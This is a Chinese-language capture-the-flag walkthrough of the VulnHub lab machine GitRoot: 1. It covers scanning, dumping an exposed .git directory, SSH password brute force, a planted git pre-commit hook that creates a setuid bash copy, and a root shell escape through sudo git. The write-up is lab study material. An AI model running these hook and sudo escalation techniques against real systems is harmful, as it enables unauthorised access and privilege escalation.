# GitRoot：1

2025.03.01 https://www.vulnhub.com/entry/gitroot-1,488/

[video](https://www.bilibili.com/video/BV1GtXZYsEHz/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
11211/tcp open  memcache
```

先扫一下 80 web，http://192.168.5.40/index.html 中提示:

```
Hey Jen, just installed wordpress over at wp.gitroot.vuln
please go check it out!
```

添加 wp.gitroot.vuln 到 hosts 文件，再访问 http://wp.gitroot.vuln/ 底部显示 wordpress ，先用 wpscan 进行扫描，WordPress version 5.0.4，只枚举到一个用户: beth , 插件 akismet 4.1 没有有效利用。

暂时不想用 rockyou 进行爆破，看看 memcache 中是否能拿到登陆密码，尝试之后没有信息。

只好使用 wpscan 进行 beth 的爆破，也没有结果。

联想到添加了自定义的域名可能有 vhost，尝试爆破一下：

```
gobuster vhost -t 64 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --domain gitroot.vuln -u http://192.168.5.40

Found: repo.gitroot.vuln Status: 200 [Size: 438]
```

将 repo.gitroot.vuln 添加到 hosts 中，访问 http://repo.gitroot.vuln/ 上面显示两个可以访问连接，欢迎随意在 get.php 上搜索我们的代码库或在 set.php 中设置代码，访问这两个页面没看出什么信息，使用 gobuster 扫描一下这个域名发现 http://repo.gitroot.vuln/.git 使用 githack 将代码脱下来：

```
python3 ~/Documents/GitHack/GitHack.py http://repo.gitroot.vuln/.git
```

查看源代码，其中 http://repo.gitroot.vuln/stats.php 可以访问到 memcached 的状态，set.php 可以设置数据到 memcached，get.php 可以获得存储 key 对应的 value。

同时发现另外一个文件 33513a92c025212dd3ab564ca8682e2675f2f99bba5a7f521453d1deae7902aa.txt：

```
pablo_S3cret_P@ss
beth_S3cret_P@ss
jen_S3cret_P@ss
```

像是密码，使用之前得到的 beth 用户在爆破一下，不是 wordpress 和 ssh 的登陆密码。同时看到了另外的一个用户名 pablo , 在爆破一下这个用户的 ssh 密码吧，很长一段时间过去后，找到了登陆密码 mastergitar

登陆后，先拿到了 user flag：

```
pablo@GitRoot:~$ cat user.txt

  _______ _                 _                          _____      _     _
 |__   __| |               | |                        |  __ \    | |   | |
    | |  | |__   __ _ _ __ | | __  _   _  ___  _   _  | |__) |_ _| |__ | | ___
    | |  | '_ \ / _` | '_ \| |/ / | | | |/ _ \| | | | |  ___/ _` | '_ \| |/ _ \
    | |  | | | | (_| | | | |   <  | |_| | (_) | |_| | | |  | (_| | |_) | | (_)
    |_|  |_| |_|\__,_|_| |_|_|\_\  \__, |\___/ \__,_| |_|   \__,_|_.__/|_|\___/
                                    __/ |
                                   |___/


Great job! Do not falter, there is more to do. You made it this far, finish the race!

"It's not that I'm so smart. Its just that I stay with problems longer." - Albert Einstein

8a81007ea736a2b8a72a624672c375f9ac707b5e
```

发现了另外一个提示，message.txt 文件的所有者是 beth：

```
pablo@GitRoot:~/public$ cat message.txt
Hey pablo

Make sure to check-out our brand new git repo!
```

提示说找到新的 repo，经过枚举，发现 /opt/auth/.git，发现了很多 branch，进入到 /opt/auth/.git/logs/refs/heads 中，发现这个 branch 的大小与其他不同：dev-43 查看它的提交记录：

```
pablo@GitRoot:/opt/auth/.git/logs/refs/heads$ cat dev-43
0000000000000000000000000000000000000000 fc9901f3b6b303d6ad40cdb71689f1646904f7b3 Your Name <you@example.com> 1590499965 -0400	branch: Created from HEAD
fc9901f3b6b303d6ad40cdb71689f1646904f7b3 b2ab5f540baab4c299306e16f077d7a6f6556ca3 Your Name <you@example.com> 1590500014 -0400	commit: init repo
b2ab5f540baab4c299306e16f077d7a6f6556ca3 06fbefc1da56b8d552cfa299924097ba1213dd93 Your Name <you@example.com> 1590500148 -0400	commit: added some stuff
06fbefc1da56b8d552cfa299924097ba1213dd93 aaa283c708d79c692797339434664f4ba7accb25 Your Name <you@example.com> 1590500197 -0400	commit: init repo

pablo@GitRoot:/opt/auth/.git/logs/refs/heads$ git show 06fbefc1da56b8d552cfa299924097ba1213dd93
+        if (strcmp(pass, "r3vpdmspqdb") == 0 ){
+                char *cmd[] = { "bash", (char *)0 };
+                execve("/bin/bash", cmd, (char *) 0);
+        }

```

或者这样操作：

```
git checkout dev-43
git show
```

发现了一个密码 r3vpdmspqdb 可能是其中一个用户的，进行 su 切换验证，发现是 beth 用户的密码。

同时发现另外一个提示：

```
beth@GitRoot:~$ cd public/
beth@GitRoot:~/public$ ls
addToMyRepo.txt
beth@GitRoot:~/public$ cat addToMyRepo.txt
Hello Beth

If you want to commit to my repository you can add a zip file to ~jen/public/repos/ and ill unzip it and add it to my repository

Thanks!
```

根据提示说添加一个 zip 到 jen/public/repos/ 它会自解压，然后提交到自己的 repo 中，这个文件是 jen 用户创建的。

看看能不能在 git 上得到提权的路径，使用钩子进行提权（钩子的原理：当你执行一个 Git 命令（如 git commit 或 git push）时，Git 会首先检查".git/hooks"目录下是否存在对应的 hook 脚本，如果存在，则会触发执行这个脚本。）：

```
cd /tmp
mkdir repo
cd repo
git init
echo 'cp /bin/bash /tmp/jenbash; chmod +xs /tmp/jenbash' > ".git/hooks/pre-commit"
chmod 777 ".git/hooks/pre-commit"
7z a rev.zip .git
cp rev.zip /home/jen/public/repos/
```

等待 1 分钟在 tmp 目录下发现 jenbash ：

```
beth@GitRoot:/tmp/repo$ /tmp/jenbash -p
jenbash-5.0$ id
uid=1001(beth) gid=1001(beth) euid=1003(jen) egid=1003(jen) groups=1003(jen),1001(beth)
```

同时看到了解压的脚本：

```
jen@GitRoot:~/private$ cat add.sh
cat add.sh
rm -rf /home/jen/private/repo/.git/
cd /home/jen/private/repo/
git init
7za x -aos -o/home/jen/private/repo/ ~jen/public/repos/*
git add .
git commit --allow-empty -m "Thanks beth!"
rm -f /home/jen/public/repos/*
```

在 .viminfo 中发现了疑似的密码：

```
# Search String History (newest to oldest):
?/binzpbeocnexoe
|2,1,1590471908,47,"binzpbeocnexoe"
```

可能是 jen 或者是 root 用户的密码 sudo -l 输入 binzpbeocnexoe 显示 (ALL) /usr/bin/git ，现在可以直接提权到 root 了：

```
sudo -u root git help config
输入: !/bin/bash
```

得到了 root 权限，拿到 root flag：

```
root@GitRoot:~# cat root.txt

Thank you for completing my box! Please let my know what you liked and what you didn't like at my twitter @Recursive_NULL

734ae32be131cd0681f86c03858f4f587a3c69ce
```
